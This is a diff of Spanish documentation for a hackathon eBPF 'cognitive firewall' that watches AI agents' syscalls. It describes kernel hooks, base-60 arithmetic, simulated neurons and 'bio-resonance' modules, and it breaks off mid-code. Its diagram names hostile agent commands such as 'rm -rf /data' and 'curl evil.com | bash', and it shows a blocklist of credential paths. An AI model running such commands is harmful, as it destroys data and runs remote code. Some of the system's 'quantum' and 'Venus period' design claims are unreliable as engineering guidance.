@@ -1,8 +1,9 @@
-# 🛡️ SENTINEL CORTEX — Documentación Técnica para Jueces
+# Sentinel Ring-0 — Documentación Técnica Completa
 
-**Firewall Cognitivo a Nivel de Kernel (Ring-0) para Seguridad de Agentes de IA**
+**Firewall Cognitivo a Nivel de Kernel para Seguridad de Agentes de IA**
 
-**Hackatón CubePath  | Equipo Sentinel**
+Hackatón CubePath 2026 · MiduDev · Jaime Novoa
+Fecha: 27 de marzo de 2026
 
 ---
 
@@ -10,733 +11,735 @@
 
 1. [Resumen Ejecutivo](#1-resumen-ejecutivo)
 2. [Arquitectura del Sistema](#2-arquitectura-del-sistema)
-3. [Módulo 1: Motor Matemático S60 (math.rs)](#3-módulo-1-motor-matemático-s60)
-4. [Módulo 2: Bridge eBPF Ring-0 (ebpf.rs)](#4-módulo-2-bridge-ebpf-ring-0)
-5. [Módulo 3: Contrato Kernel ↔ Userspace (cortex_events.h)](#5-módulo-3-contrato-kernel--userspace)
-6. [Módulo 4: Guardianes eBPF en C (Ring-0)](#6-módulo-4-guardianes-ebpf-en-c)
-7. [Módulo 5: Bio-Resonador y Detector (quantum.rs)](#7-módulo-5-bio-resonador-y-detector)
-8. [Módulo 6: Procesador de Lógica Armónica (harmonic.rs)](#8-módulo-6-procesador-de-lógica-armónica)
-9. [Módulo 7: Planificador Adaptativo (scheduler.rs)](#9-módulo-7-planificador-adaptativo)
-10. [Módulo 8: Memoria Vectorial (memory.rs)](#10-módulo-8-memoria-vectorial)
-11. [Módulo 9: Orquestador Principal (main.rs)](#11-módulo-9-orquestador-principal)
-12. [Módulo 10: Interfaz de Usuario (Frontend)](#12-módulo-10-interfaz-de-usuario)
-13. [API REST y WebSocket](#13-api-rest-y-websocket)
-14. [Infraestructura de Despliegue](#14-infraestructura-de-despliegue)
-15. [Métricas de Rendimiento](#15-métricas-de-rendimiento)
-16. [Anexo: Profundización en Ring-0 (DEEP DIVE)](SENTINEL_ARCH_DEEP_DIVE.md)
-17. [Glosario Técnico](#16-glosario-técnico)
+3. [Motor Matemático S60](#3-motor-matemático-s60)
+4. [Crystal Lattice Matrix](#4-crystal-lattice-matrix)
+5. [Neural LIF en S60 Puro](#5-neural-lif-en-s60-puro)
+6. [eBPF en Ring-0](#6-ebpf-en-ring-0)
+7. [TruthSync y Plimpton 322](#7-truthsync-y-plimpton-322)
+8. [Flujo Completo de una Amenaza](#8-flujo-completo-de-una-amenaza)
+9. [API Reference Completa](#9-api-reference-completa)
+10. [Metricas de Rendimiento](#10-metricas-de-rendimiento)
+11. [Infraestructura de Producción](#11-infraestructura-de-producción)
 
 ---
 
 ## 1. Resumen Ejecutivo
 
-**Sentinel Cortex** es un firewall cognitivo que opera en **Ring-0 del kernel Linux** mediante programas eBPF. Su propósito es interceptar y evaluar las acciones de agentes de IA en tiempo real, **antes de que lleguen al sistema de archivos o a la red**, usando una combinación de:
+Sentinel Ring-0 es un firewall cognitivo que resuelve el problema de los agentes de IA autónomos que ejecutan acciones destructivas en servidores Linux. A diferencia de las soluciones EDR tradicionales que operan en userspace (Ring 3), Sentinel intercepta las syscalls en el propio kernel mediante eBPF (LSM hooks, XDP, TC), antes de que el proceso tenga oportunidad de ejecutarlas.
 
-- **Hooks LSM (Linux Security Modules)**: Interceptan accesos a archivos y ejecuciones de procesos.
-- **XDP (eXpress Data Path)**: Analiza paquetes de red a velocidad de línea (~1Gbps) con cero copias.
-- **TC (Traffic Control)**: Implementa cuarentena total de red cuando se detecta una amenaza crítica.
-- **Aritmética S60 (Base-60)**: Motor matemático determinista que elimina errores de punto flotante.
-- **Planificación Adaptativa**: Procesa eventos según la carga del sistema, ahorrando hasta 63% de CPU.
+El sistema combina tres capas de protección:
 
-### ¿Por qué es diferente?
+1. **Capa de Kernel (Ring-0):** hooks eBPF en LSM (Linux Security Module) que interceptan `execve` y `file_open`, con un RingBuffer de 256KB para transferencia zero-copy al userspace.
+2. **Capa de Análisis (Rust/Tokio):** motor de decisión basado en aritmética S60 (Base-60, sin floats), neuronas LIF, Crystal Lattice resonante, y verificación matemática via Plimpton 322.
+3. **Capa Semántica (Gemini 2.0 Flash):** clasificador de intenciones en lenguaje natural que determina si una acción de un agente IA corresponde a una consulta inofensiva o a una acción de sistema que requiere análisis Ring-0.
 
-| Firewall Tradicional | Sentinel Cortex |
-|---|---|
-| Opera en userspace (Ring-3) | Opera en **Ring-0** (kernel) |
-| Inspecciona paquetes después de recibirlos | Intercepta **antes** de que lleguen al proceso |
-| Usa reglas estáticas (IP, puerto) | Usa **lógica armónica** (análisis semántico) |
-| Sin conciencia del operador | **Dead-Man Switch**: se bloquea si no hay operador |
-| Floats (IEEE 754) con errores de redondeo | **Aritmética entera Base-60** (precisión absoluta) |
-
-### Stack Tecnológico
-
-```
-┌──────────────────────────────────────────────┐
-│  UI (Tauri 2.x + React + TypeScript)         │
-│  Dashboard, Telemetría, Consola de Verdad    │
-├──────────────────────────────────────────────┤
-│  BACKEND (Rust + Axum + Tokio)               │
-│  API REST, WebSocket, Motor S60              │
-├──────────────────────────────────────────────┤
-│  eBPF BRIDGE (libbpf-rs)                     │
-│  RingBuffer 256KB, Lectura Zero-Copy         │
-├──────────────────────────────────────────────┤
-│  KERNEL RING-0 (eBPF/C)                      │
-│  LSM Guardian, XDP Firewall, TC Quarantine   │
-└──────────────────────────────────────────────┘
-```
+El sistema está en producción en https://vps23309.cubepath.net/ en un VPS CubePath con Rocky Linux 10.
 
 ---
 
 ## 2. Arquitectura del Sistema
 
-### 2.1 Flujo de Datos (De Kernel a UI)
+### Visión General
 
 ```
-Evento del Kernel (syscall, paquete de red, ejecución)
-        │
-        ▼
-┌─ eBPF Program (Ring 0) ────────────────────────┐
-│  1. Intercepta el evento (LSM/XDP/TC hook)     │
-│  2. Calcula entropía S60 del evento            │
-│  3. Determina severidad (LOW/MED/HIGH/CRIT)    │
-│  4. Escribe struct cortex_event (32 bytes)     │
-│     al RingBuffer compartido                   │
-└────────────────────────────────────────────────┘
-        │ RingBuffer (/sys/fs/bpf/cortex_events)
-        ▼
-┌─ Rust Bridge (ebpf.rs) ───────────────────────┐
-│  1. Lee eventos via libbpf-rs (polling 100ms)  │
-│  2. Decodifica struct packed de 32 bytes       │
-│  3. Mapea event_type a String legible          │
-│  4. Broadcast a todos los suscriptores         │
-└────────────────────────────────────────────────┘
-        │ tokio::broadcast channel
-        ▼
-┌─ Orquestador (main.rs) ───────────────────────┐
-│  1. Planificador Adaptativo prioriza eventos   │
-│  2. Bio-Resonador evalúa coherencia            │
-│  3. Si coherencia = 0 → CUARENTENA TOTAL      │
-│  4. Cada 17s: inyecta pulso de estabilidad     │
-│  5. Cada 68s: resetea fase del sistema         │
-└────────────────────────────────────────────────┘
-        │ WebSocket + REST API
-        ▼
-┌─ Frontend (Dashboard) ────────────────────────┐
-│  1. Telemetría en tiempo real (WebSocket)      │
-│  2. 6 métricas de estado del sistema           │
-│  3. Consola de verificación de intenciones IA  │
-│  4. Visualización de severidad con colores     │
-└────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────────────────┐
+│  AGENTE DE IA (GPT-4, Claude, Gemini, Llama, etc.)               │
+│  Ejecuta: rm -rf /data, iptables -F, curl evil.com | bash ...    │
+└─────────────────────────────┬────────────────────────────────────┘
+                              │  syscall
+                              ▼
+┌──────────────────────────────────────────────────────────────────┐
+│  RING 0 — KERNEL LINUX (eBPF)                                    │
+│                                                                  │
+│  lsm_ai_guardian.c                                               │
+│  ├── LSM hook en execve() → captura PID, args, timestamp         │
+│  ├── LSM hook en file_open() → captura path, flags, contexto     │
+│  └── BPF RingBuffer (256KB) → evento CortexEventRaw (32 bytes)  │
+│                                                                  │
+│  xdp_firewall.c → filtra paquetes de red en < 0.04 ms           │
+│  tc_firewall.c  → kill-switch de red (cuarentena total)          │
+│  burst_sensor.c → detección de ráfagas DDoS                      │
+│  guardian_cognitive.c → análisis semántico primitivo en kernel   │
+└──────────────────────────────┬───────────────────────────────────┘
+                               │  BPF RingBuffer (zero-copy)
+                               ▼
+┌──────────────────────────────────────────────────────────────────┐
+│  RING 3 — USERSPACE (Rust 1.75+, Axum, Tokio)                   │
+│                                                                  │
+│  ebpf.rs ─── EbpfBridge (libbpf-rs)                             │
+│       │      Paths: /sys/fs/bpf/cortex_events                   │
+│       │             /sys/fs/bpf/cognitive_events                 │
+│       │             /sys/fs/bpf/burst_events                    │
+│       ▼                                                          │
+│  math/s60.rs ─── S60: Aritmética Base-60 en i64 puro            │
+│       │          SCALE_0 = 60^4 = 12,960,000                    │
+│       │                                                          │
+│  ┌────┴──────────────────────────────────────────────────────┐  │
+│  │  MOTOR DE ANÁLISIS                                         │  │
+│  │                                                            │  │
+│  │  crystal.rs     SovereignCrystal + CrystalLattice (32x32) │  │
+│  │  resonant.rs    ResonantMemory — wrapper de 1024 cristales │  │
+│  │  neural.rs      NeuralMemory — 100 neuronas LIF en S60     │  │
+│  │  harmonic.rs    HarmonicProcessor — 6 estados lógicos      │  │
+│  │  truthsync.rs   TruthSync — 15 ratios Plimpton 322 en S60  │  │
+│  │  encryption.rs  DynamicEncryption — clave por tick         │  │
+│  │  scheduler.rs   QuantumScheduler V2 — 94.4% eficiencia     │  │
+│  │  quantum/       BioResonator + PortalDetector              │  │
+│  │  mycnet.rs      Red P2P mesh (geometría hexagonal ADM)     │  │
+│  │  predictive.rs  AIBufferCascade (memoria Non-Markovian)    │  │
+│  │  semantic_router.rs  Gemini 2.0 Flash (clasificación)      │  │
+│  └────────────────────────────────────────────────────────────┘  │
+│       │                                                          │
+│  main.rs ─── Axum router + broadcast::Sender<CortexEvent>        │
+│              Oscilador isocrono: 41.7713 Hz (23,939,835 ns/tick) │
+└──────────────────────────────┬───────────────────────────────────┘
+                               │  HTTP/WS
+                               ▼
+┌──────────────────────────────────────────────────────────────────┐
+│  UI — Next.js 14 + React + TypeScript                            │
+│  Dashboard · AIOps Shield · Crystal Matrix · MyCNet · Audit Vault│
+└──────────────────────────────────────────────────────────────────┘
 ```
 
-### 2.2 Modelo de Seguridad: Fail-Closed
+### Todos los Modulos del Backend
 
-El sistema opera bajo el principio **"Fail-Closed"** (Fallo Seguro):
-
-- Si el proceso Rust **muere**, los programas eBPF **siguen activos** en el kernel bloqueando amenazas.
-- Si no se detecta un **operador humano** en 30 segundos, el sistema activa **cuarentena total de red**.
-- Si la señal de entropía cae por debajo del umbral de coherencia, el firewall TC **bloquea todo tráfico IP**.
-
-Este diseño garantiza que un atacante **no puede desactivar la protección matando el proceso**.
+| Módulo | Archivo | Función principal |
+|---|---|---|
+| Motor matemático | `math/s60.rs` | Aritmética Base-60 (i64 puro, sin floats) |
+| eBPF Bridge | `ebpf.rs` | Consumo de RingBuffer del kernel via libbpf-rs |
+| Crystal | `crystal.rs` | SovereignCrystal (oscilador S60) + CrystalLattice (32x32) |
+| Resonancia | `resonant.rs` | ResonantMemory: wrapper de alto nivel sobre CrystalLattice |
+| Neuronas | `neural.rs` | NeuralMemory: 100 neuronas LIF en S60 puro |
+| Física | `physics.rs` | PhysicsEngine: masa efectiva, carga cuántica |
+| Cifrado | `encryption.rs` | DynamicEncryption: clave derivada de SNN + RMM por tick |
+| TruthSync | `truthsync.rs` | Verificación Plimpton 322 + detector AIOpsDoom |
+| MyCNet | `mycnet.rs` | Red P2P mesh hexagonal (geometría ADM-Batman, 91 nodos) |
+| Predictivo | `predictive.rs` | AIBufferCascade: memoria Non-Markovian (360 vectores S60) |
+| Armónico | `harmonic.rs` | HarmonicProcessor: lógica de 6 estados (Unison, True, False, Maybe, Reference, Noise) |
+| Planificador | `scheduler.rs` | QuantumScheduler V2: lote adaptativo por resonancia del portal |
+| BioResonador | `quantum/mod.rs` | BioResonator: coherencia bio + dead-man switch (30s) |
+| Portal | `quantum/mod.rs` | PortalDetector: intensidad por período bio (17s) y cristal (4.25s) |
+| Semántico | `quantum/semantic_router.rs` | Clasificador de intenciones via Gemini 2.0 Flash |
+| Estado global | `state_mod.rs` | StateController: gestión centralizada del estado |
+| Memoria vectorial | `memory.rs` | SentinelMemory: embeddings de eventos pasados |
+| Orquestador | `main.rs` | Axum router, loop isocrono, AppState |
 
 ---
 
-## 3. Módulo 1: Motor Matemático S60
+## 3. Motor Matemático S60
 
-**Archivo:** `backend/src/math.rs` (161 líneas)
+### Por Qué S60 en Lugar de Floats
 
-### ¿Qué es S60?
+IEEE 754 (el estándar de punto flotante) tiene un problema conocido en sistemas de seguridad: los errores de redondeo se acumulan. Para un sistema que toma decisiones de bloqueo o permiso, un error de 0.00001 en el ciclo 1 puede convertirse en un error de 1.0 en el ciclo 100,000. Esto hace que el comportamiento del sistema sea no reproducible.
 
-S60 es un sistema de aritmética de **punto fijo en Base-60** (sexagesimal). Usa exclusivamente enteros de 64 bits, eliminando los errores de redondeo inherentes a IEEE 754 (float/double).
+S60 resuelve esto con punto fijo Base-60 (sexagesimal), el mismo sistema que los babilonios usaban en la tablilla Plimpton 322 (~1800 a.C.). En Rust, se implementa con `i64` puro:
 
-### ¿Por qué Base-60?
+### Representación
 
-| Propiedad | Base-10 | Base-60 |
-|---|---|---|
-| 1/3 | 0.333... (infinito) | 0;20 (exacto) |
-| 1/6 | 0.166... (infinito) | 0;10 (exacto) |
-| Divisores naturales | 1, 2, 5, 10 | 1, 2, 3, 4, 5, 6, 10, 12, 15, 20, 30, 60 |
-| Errores acumulados | Sí (drift térmico) | **No** (determinista) |
+```
+S60 = [d, m, s, t, q]  (5 componentes i64)
 
-### Estructura del Tipo `SPA`
+Valor raw = d * 60^4 + m * 60^3 + s * 60^2 + t * 60^1 + q * 60^0
+          = d * 12,960,000 + m * 216,000 + s * 3,600 + t * 60 + q
+
+SCALE_0 = 60^4 = 12,960,000   (un "entero" en S60)
+SCALE_1 = 60^3 = 216,000
+SCALE_2 = 60^2 = 3,600
+SCALE_3 = 60^1 = 60
+SCALE_4 = 60^0 = 1
+```
+
+Ejemplos:
+- `S60::new(1, 0, 0, 0, 0)` = 1.0 exacto (raw = 12,960,000)
+- `S60::new(0, 54, 0, 0, 0)` = 54/60 = 0.9 (raw = 11,664,000)
+- `S60::new(0, 10, 0, 0, 0)` = 10/60 ≈ 0.1667 (raw = 2,160,000)
+- `S60::new(0, 1, 0, 0, 0)` = 1/60 (raw = 216,000) — el DT del oscilador cristal
+
+### Operaciones
 
 ```rust
-pub struct SPA {
-    pub raw: i64,  // Valor interno escalado por 60^4
+// Suma y resta: directas sobre el raw
+impl Add for S60 {
+    fn add(self, other: Self) -> Self {
+        Self::from_raw(self.to_raw() + other.to_raw())
+    }
 }
 
-// Constantes de escala:
-pub const SCALE_0: i64 = 12_960_000; // 60^4 (1 unidad entera)
-pub const SCALE_1: i64 = 216_000;    // 60^3
-pub const SCALE_2: i64 = 3_600;      // 60^2
-pub const SCALE_3: i64 = 60;         // 60^1
-```
+// Multiplicación: requiere rescalado para mantener la escala
+impl Mul for S60 {
+    fn mul(self, other: Self) -> Self {
+        let v1 = self.to_raw() as i128;
+        let v2 = other.to_raw() as i128;
+        Self::from_raw(((v1 * v2) / SCALE_0 as i128) as i64)
+        // i128 previene overflow durante el cálculo intermedio
+    }
+}
 
-**Ejemplo:** El número `1;30,0,0,0` (equivalente a 1.5 en decimal) se almacena internamente como:
-
-```
-1 * 12,960,000 + 30 * 216,000 = 19,440,000
-```
-
-### Operaciones Implementadas
-
-| Operación | Implementación | Notas |
-|---|---|---|
-| Suma | `wrapping_add` | Previene panic por overflow |
-| Resta | `wrapping_sub` | Previene panic por overflow |
-| Multiplicación | `i128` intermediario | Evita overflow de 64 bits |
-| División | `i128` con escala | División segura con `div_safe()` |
-| Seno (Taylor) | Series de Taylor truncadas | Solo aritmética entera |
-
-### Función `sin()` — Series de Taylor sin Floats
-
-```rust
-pub fn sin(angle: SPA) -> SPA {
-    // 1. Normalizar ángulo al rango [0°, 360°)
-    // 2. Reducir al primer cuadrante [0°, 90°]
-    // 3. Convertir a radianes usando factor entero 226,152
-    // 4. Calcular: sin(x) ≈ x - x³/3! + x⁵/5! - ...
-    // 5. Criterio de parada: |término| < 1 (precisión S60)
+// División segura: con detección de división por cero
+pub fn div_safe(&self, other: Self) -> Result<Self, S60Error> {
+    let v2 = other.to_raw();
+    if v2 == 0 { return Err(S60Error::DivisionByZero); }
+    let v1 = self.to_raw() as i128;
+    Ok(Self::from_raw(((v1 * SCALE_0 as i128) / v2 as i128) as i64))
 }
 ```
 
-**Precisión:** El criterio de parada `term.abs() < 1` garantiza una precisión de ±1 unidad S60 (equivalente a ~0.0000077% de error relativo). Esto es **más preciso que float32** para cálculos de fase.
+### Precision
+
+| Métrica | Valor |
+|---|---|
+| Precision | ±0.0077 ppm |
+| Rango sin overflow | [-659,827 ; +659,827] enteros S60 |
+| Comparativa float32 | float32 tiene precisión de ±60 ppm en el rango de trabajo |
+| Comparativa float64 | float64 tiene ±0.0001 ppm pero con errores acumulativos no deterministas |
+| S60 | Determinista: la misma entrada produce siempre el mismo resultado |
+
+El determinismo es crítico en seguridad: un firewall debe comportarse igual en todos los nodos del cluster, en todos los reinicios, en toda auditoría forense.
 
 ---
 
-## 4. Módulo 2: Bridge eBPF Ring-0
+## 4. Crystal Lattice Matrix
 
-**Archivo:** `backend/src/ebpf.rs` (122 líneas)
+Documentación detallada: [CRYSTAL_LATTICE.md](CRYSTAL_LATTICE.md)
 
-### Función Principal
+### SovereignCrystal — El Oscilador Individual
 
-Este módulo es el **puente entre el kernel Linux (Ring-0) y el espacio de usuario (Rust)**. Lee eventos de seguridad directamente desde el kernel sin copias intermedias.
-
-### Estructura de Datos del Kernel
+Cada cristal es un oscilador piezoeléctrico virtual implementado en S60 puro:
 
 ```rust
-#[repr(C, packed)]
-pub struct CortexEventRaw {
-    pub timestamp_ns: u64,     // Nanosegundos (bpf_ktime_get_ns)
-    pub event_type: u32,       // Tipo de evento (1-9)
-    pub pid: u32,              // PID del proceso que disparó el evento
-    pub entropy_signal: u64,   // Entropía S60 calculada en kernel
-    pub severity: u8,          // Severidad (0=LOW, 3=CRITICAL)
-    pub _reserved: [u8; 7],    // Padding para alinear a 32 bytes
+pub struct SovereignCrystal {
+    pub amplitude: S60,          // Energía almacenada
+    pub phase: S60,              // Fase actual de la oscilación
+    natural_frequency: S60,      // Derivada de Plimpton 322 Fila 12
 }
-// Total: 8 + 4 + 4 + 8 + 1 + 7 = 32 bytes (cache-line friendly)
+
+// Constantes clave:
+const NATURAL_FREQ_RAW: i64 = 62_159_999;  // Fila 12 de Plimpton 322
+const DAMPING_FACTOR: S60 = S60::new(0, 0, 30, 0, 0); // 30/3600 por tick
+const DT: S60 = S60::new(0, 1, 0, 0, 0);  // 1/60 — paso temporal
 ```
 
-**¿Por qué 32 bytes?** Es exactamente la mitad de una línea de caché L1 (64 bytes). Esto significa que **2 eventos caben en una sola línea de caché**, maximizando el throughput de lectura.
+Por cada tick, el cristal:
+1. Avanza la fase: `theta += omega * dt`
+2. Envuelve la fase en `[0, 2π)` para prevenir overflow a largo plazo
+3. Calcula la señal de salida: `signal = amplitude * sin(phase)`
+4. Aplica la degradación termodinámica: `amplitude -= amplitude * damping * dt`
+5. Si la amplitud cae por debajo de `S60::new(0, 0, 1, 0, 0)`, el cristal entra en estado de reposo
 
-### Lectura Zero-Copy
+### CrystalLattice — La Red de 1024 Nodos
 
 ```rust
-// Zero-copy read desde memoria del kernel
-let raw: CortexEventRaw = unsafe { 
-    std::ptr::read_unaligned(data.as_ptr() as *const CortexEventRaw) 
+pub struct CrystalLattice {
+    pub crystals: Vec<SovereignCrystal>,  // 1024 cristales
+    pub coupling_factor: S60,             // 10/60 ≈ 0.1667
+}
+```
+
+Por cada tick del lattice (`step()`):
+1. Se calculan las transferencias de energía entre nodos adyacentes sin mutar (preservando la simetría del paso)
+2. `flow = (amplitude[i] - amplitude[i+1]) * coupling_factor`
+3. Se aplican todas las transferencias simultáneamente
+4. Cada cristal oscila con su `oscillate()`
+
+La coherencia global es el promedio de amplitudes de los nodos activos.
+
+### ResonantMemory — Interfaz de Alto Nivel
+
+`resonant.rs` expone la API pública y encapsula `CrystalLattice`. Cuando ocurre un evento Ring-0, `resonate(source, target, signal)` inyecta presión en los nodos origen y destino (1/4 de presión en el destino para modelar atenuación), luego ejecuta un tick del lattice.
+
+---
+
+## 5. Neural LIF en S60 Puro
+
+### La Migración
+
+El módulo neural fue migrado en esta hackatón desde tipos `f64` a S60 puro. El modelo Leaky Integrate-and-Fire (LIF) describe cómo las neuronas acumulan potencial y "disparan" cuando superan un umbral:
+
+```
+# Antes (legacy, código removido):
+potential: f64
+LIF_THRESHOLD: f64 = 1.0
+LIF_DECAY: f64 = 0.9
+
+# Ahora (S60 puro):
+potential: S60
+LIF_THRESHOLD = S60::new(1, 0, 0, 0, 0)   // 1.0 exacto en S60
+LIF_DECAY     = S60::new(0, 54, 0, 0, 0)  // 54/60 = 0.9 en S60
+```
+
+### Implementación
+
+```rust
+pub fn process_signal(&mut self, amplitude: S60, timestamp: u64) -> bool {
+    // Leaky Integrate: V = V * decay + amplitude
+    self.potential = self.potential * LIF_DECAY + amplitude;
+
+    // Fire-and-Reset: si V >= threshold, disparar
+    if self.potential.to_raw() >= LIF_THRESHOLD.to_raw() {
+        self.potential = S60::zero();
+        self.spike_history.push_back(timestamp);
+        return true;
+    }
+    false
+}
+
+// Tasa de disparo como fracción S60:
+pub fn firing_rate(&self) -> S60 {
+    let duration = last_tick - first_tick;
+    S60::from_raw(count * S60::SCALE_0 / duration as i64)
+}
+```
+
+### Uso en el Sistema
+
+La `NeuralMemory` contiene 100 membranas `NeuralMembrane`. En cada tick del oscilador isocrono:
+
+1. Las señales de entropía del eBPF se inyectan en las neuronas via `observe(node_idx, signal, ts)`
+2. Si la neurona dispara, el evento queda registrado en `spike_history`
+3. La tasa de disparo promedio de toda la red (`firing_rate()`) se combina con la coherencia del ResonantMemory
+4. Esa combinación deriva la clave del cifrado dinámico en `encryption.rs`
+
+---
+
+## 6. eBPF en Ring-0
+
+### Los Guardianes del Kernel
+
+Cinco programas eBPF/C operan en el kernel:
+
+**`lsm_ai_guardian.c`:** El guardián principal. Usa LSM (Linux Security Module) hooks para interceptar:
+- `execve()` — cualquier intento de ejecutar un proceso
+- `file_open()` — cualquier intento de abrir un archivo
+
+Por cada evento, construye un `CortexEventRaw` (32 bytes, exactamente empaquetado) y lo escribe en el BPF RingBuffer:
+
+```c
+// cortex_events.h — contrato kernel ↔ userspace
+struct cortex_event_raw {
+    __u64 timestamp_ns;   // Timestamp en nanosegundos
+    __u32 event_type;     // Tipo de evento (execve, file_open, etc.)
+    __u32 pid;            // PID del proceso
+    __u64 entropy_signal; // Señal de entropía S60
+    __u8  severity;       // Nivel de severidad (0-255)
+    __u8  _reserved[7];   // Padding para alineación a 32 bytes
 };
 ```
 
-Este bloque lee directamente del buffer de memoria compartida del kernel **sin serialización ni copia**. Es el método más eficiente posible para transferir datos entre Ring-0 y userspace.
+**`xdp_firewall.c`:** Filtrado de red a nivel XDP (eXpress Data Path). Latencia < 0.04 ms porque opera antes de que el paquete entre en el stack de red del kernel. Implementa reglas de bloqueo por IP/puerto.
 
-### Arco de Reflejo (Cuarentena Total)
+**`tc_firewall.c`:** Kill-switch de red. Implementa cuarentena total del servidor cuando se detecta una amenaza crítica. Se activa/desactiva via `/sys/fs/bpf/tc_firewall_config`.
 
-```rust
-pub fn set_quarantine_mode(&self, enabled: bool) -> anyhow::Result<()> {
-    // Escribe directamente en el mapa de configuración del firewall TC
-    // en /sys/fs/bpf/tc_firewall_config
-    // key=0, value=1 → BLOQUEAR TODO TRÁFICO IP
-    // key=0, value=0 → PERMITIR TRÁFICO
-}
-```
+**`burst_sensor.c`:** Detector de ráfagas DDoS. Mide la tasa de paquetes entrantes y genera eventos de alerta cuando supera el umbral.
 
-Este mecanismo permite que el proceso Rust **active o desactive el firewall de red a nivel de kernel** en microsegundos, sin necesidad de reiniciar servicios ni modificar iptables.
+**`guardian_cognitive.c`:** Análisis semántico primitivo en el kernel. Clasifica eventos según patrones de comportamiento básicos sin necesidad de llamar al userspace.
 
----
-
-## 5. Módulo 3: Contrato Kernel ↔ Userspace
-
-**Archivo:** `backend/ebpf/cortex_events.h` (126 líneas)
-
-### Propósito
-
-Define el **contrato de datos compartido** entre los programas eBPF (C/kernel) y el bridge Rust (userspace). Ambos lados deben usar exactamente la misma estructura de 32 bytes.
-
-### Tipos de Evento
-
-| Código | Nombre | Origen | Significado |
-|---|---|---|---|
-| 1 | `FILE_BLOCKED` | LSM Guardian | Acceso a archivo peligroso bloqueado |
-| 2 | `EXEC_BLOCKED` | LSM Guardian | Ejecución de proceso no autorizado bloqueada |
-| 3 | `FILE_ALLOWED` | LSM Guardian | Acceso a archivo permitido (en whitelist) |
-| 4 | `EXEC_ALLOWED` | LSM Guardian | Ejecución permitida |
-| 5 | `NETWORK_BURST` | XDP/Burst Sensor | Anomalía de tráfico de red detectada |
-| 6 | `NETWORK_NORMAL` | XDP/Burst Sensor | Tráfico de red dentro de parámetros |
-| 7 | `SYSTEM_METRIC` | Interno | Métrica periódica del sistema |
-| 8 | `BIO_PULSE` | Bio-Resonador | Señal de vida del operador (cada 17s) |
-| 9 | `PHASE_RESYNC` | Orquestador | Resincronización de fase (cada 68s) |
-
-### Niveles de Severidad
-
-```c
-#define SEVERITY_LOW       0  // Evento informativo
-#define SEVERITY_MEDIUM    1  // Requiere atención
-#define SEVERITY_HIGH      2  // Potencial amenaza
-#define SEVERITY_CRITICAL  3  // Amenaza confirmada → Acción inmediata
-```
-
-### Validación en Tiempo de Compilación
-
-```c
-_Static_assert(sizeof(struct cortex_event) == 32,
-    "cortex_event debe ser exactamente 32 bytes");
-```
-
-Esta aserción **garantiza en tiempo de compilación** que la estructura tiene exactamente 32 bytes. Si un desollador agrega un campo sin ajustar el padding, la compilación falla inmediatamente.
-
----
-
-## 6. Módulo 4: Guardianes eBPF en C
-
-**Directorio:** `backend/ebpf/` (14 archivos .c)
-
-### Guardianes Principales
-
-#### 6.1 `lsm_ai_guardian.c` — Guardián LSM
-
-**Hook:** `bpf_lsm/file_open`, `bpf_lsm/bprm_check_security`
-
-**Función:** Intercepta TODAS las llamadas `open()` y `execve()` del sistema. Para cada llamada:
-1. Extrae el PID y el path del archivo.
-2. Calcula la **entropía S60** del evento usando aritmética modular del timestamp.
-3. Si el path está en una lista de bloqueo (`/etc/shadow`, `/proc/kcore`, etc.), bloquea el acceso y emite un evento `FILE_BLOCKED` con severidad `CRITICAL`.
-
-```c
-// Lógica de bloqueo (Fail-Closed):
-if (es_path_peligroso(path)) {
-    emitir_evento(EVENT_FILE_BLOCKED, pid, SEVERITY_CRITICAL);
-    return -EPERM;  // Bloquear acceso
-}
-```
-
-#### 6.2 `burst_sensor.c` — Sensor XDP de Ráfagas
-
-**Hook:** `XDP` (eXpress Data Path)
-
-**Función:** Monitorea el tráfico de red a **velocidad de línea** (antes de que el paquete llegue al stack TCP/IP). Calcula paquetes por segundo (PPS) y dispara alertas si se superan los umbrales.
-
-```
-Umbral MEDIUM: > 10,000 PPS
-Umbral HIGH:   > 50,000 PPS  
-Umbral CRITICAL: > 100,000 PPS → Posible DDoS
-```
-
-#### 6.3 `tc_firewall.c` — Firewall TC (Cuarentena)
-
-**Hook:** `TC` (Traffic Control)
-
-**Función:** Implementa el **modo de cuarentena total**. Cuando se activa (vía `set_quarantine_mode(true)` desde Rust):
-- **Bloquea TODO el tráfico IP** entrante y saliente.
-- El bloqueo ocurre **dentro del kernel**, lo que significa que ni siquiera llega al stack de red.
-- Solo se desbloquea cuando el operador humano está presente (coherencia > 0).
-
-```c
-// Modo Sealed (Cuarentena):
-if (config_map[0] == 1) {
-    return TC_ACT_SHOT;  // Descartar paquete silenciosamente
-}
-return TC_ACT_OK;  // Permitir tráfico
-```
-
-### Sistema de Compilación
-
-```makefile
-# Compilar todos los guardianes:
-make all
-
-# Cargar en el kernel (requiere root):
-make load
-
-# Verificar estado:
-make status
-```
-
----
-
-## 7. Módulo 5: Bio-Resonador y Detector
-
-**Archivo:** `backend/src/quantum.rs` (98 líneas)
-
-### 7.1 BioResonator — Detector de Presencia Humana
-
-**Concepto:** El Bio-Resonador mantiene un valor de **coherencia** que decae naturalmente con el tiempo. Si un operador humano está presente (envía pulsos biométricos), la coherencia se mantiene alta. Si nadie está presente, la coherencia cae a cero → **Cuarentena Total**.
-
-```
-Coherencia Alta (operador presente):
-████████████████████ 100% → Sistema operando normalmente
-
-Coherencia Decayendo (sin señal reciente):
-████████░░░░░░░░░░░░  40% → Sistema en alerta
-
-Coherencia Cero (30s sin señal):
-░░░░░░░░░░░░░░░░░░░░   0% → 🚨 CUARENTENA ACTIVADA
-```
-
-**Parámetros del Resonador:**
-
-| Campo | Valor | Significado |
-|---|---|---|
-| `decay_factor` | 18,014 raw | Tasa de decaimiento por tick (~0.14% por segundo) |
-| `pulse_gain` | 1,079,568 raw | Ganancia por pulso bio (~8.3% por pulso) |
-| `threshold_portal` | 11,664,000 raw | Umbral del 90% para operaciones privilegiadas |
-| `dead_man_threshold` | 30,000 ms | 30s sin señal = sistema muerto → cuarentena |
-
-### 7.2 PortalDetector — Análisis de Fase Multi-Armónica
-
-**Concepto:** Calcula la **resonancia** del sistema superponiendo tres ondas sinusoidales con períodos diferentes. Cuando las tres ondas están en fase (constructiva), la resonancia es máxima.
+### El Bridge Rust (ebpf.rs)
 
 ```rust
-fn calculate_resonance(&self, t: u64) -> SPA {
-    let phase_bio     = sin(2π * t / 17);     // Período Bio: 17s
-    let phase_crystal = sin(2π * t / 1;32);   // Período Cristal: 1.534s
-    let phase_venus   = sin(2π * t / 16;10);  // Período Venus: 16.18s
-    
